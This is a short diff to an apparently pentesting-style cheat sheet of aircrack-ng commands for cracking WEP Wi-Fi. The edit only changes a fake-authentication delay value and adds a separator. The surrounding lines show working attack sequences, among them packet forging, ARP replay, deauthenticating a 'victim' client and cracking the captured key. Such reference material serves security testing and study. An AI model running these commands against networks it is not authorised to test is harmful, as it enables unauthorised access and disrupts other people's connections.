@@ -45,7 +45,7 @@ aircrack-ng <.CAP FILENAME>
 ```
 airmon-ng start <INTERFACE> <CHANNEL>
 airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
-aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MAC INTERFACE> wlan0mon
+aireplay-ng -1 6000 -e <ESSID> -a <BSSID> -h <MAC INTERFACE> wlan0mon
 aireplay-ng -5 -b <BSSID> -h <MAC INTERFACE> wlan0mon
 packetforge-ng -0 -a <BSSID> -h <MAC INTERFACE> -l <SOURCE IP> -k <DEST IP> -y <XOR FILENAME> -w <FILENAME>
 aireplay-ng -2 -r <PACKET FILENAME> wlan0mon
@@ -65,6 +65,8 @@ aireplay-ng -3 -b <BSSID> -h <MAC wlan0mon> wlan0mon
 aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
 aircrack-ng <.CAP FILENAME>
 ```
+
+---
 
 ## WPA/WPA2 (Wi-Fi Protected Access)
 
